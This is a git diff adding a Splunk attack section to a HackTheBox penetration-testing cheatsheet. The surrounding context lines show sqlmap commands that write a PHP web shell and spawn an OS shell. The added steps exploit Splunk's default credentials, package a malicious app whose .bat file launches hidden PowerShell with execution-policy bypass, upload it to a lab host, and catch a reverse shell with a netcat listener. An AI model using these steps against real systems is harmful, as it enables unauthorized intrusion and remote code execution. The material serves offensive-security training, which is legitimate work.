@@ -74,6 +74,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [Login Brute Forcing](#login-brute-forcing)
     - [Hydra](#hydra)
 - [SQLMap](#sqlmap)
+- [Attacking Common Applications](#attacking-common-applications)
 - [Useful Resources](#useful-resources)
 
 
@@ -1909,6 +1910,27 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
+```
+## Attacking Common Applications
+```
+--> The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are admin:changeme
+--> The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication
+--> https://github.com/0xjpuff/reverse_shell_splunk
+--> sword0x00@htb[/htb]$ tree splunk_shell/
+	splunk_shell/
+	├── bin
+	└── default
+--> We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
+	@ECHO OFF
+	PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
+	Exit
+--> Once the files are created, we can create a tarball or .spl file.
+	sword0x00@htb[/htb]$ tar -cvzf updater.tar.gz reverse_shell_splunk/
+--> The next step is to choose Install app from file and upload the application.
+	https://10.129.201.50:8000/en-US/manager/search/apps/local
+--> Before uploading the malicious custom app, let's start a listener using Netcat or socat.
+	sword0x00@htb[/htb]$ sudo nc -lnvp 443
+
 ```
 ## Useful Resources
 
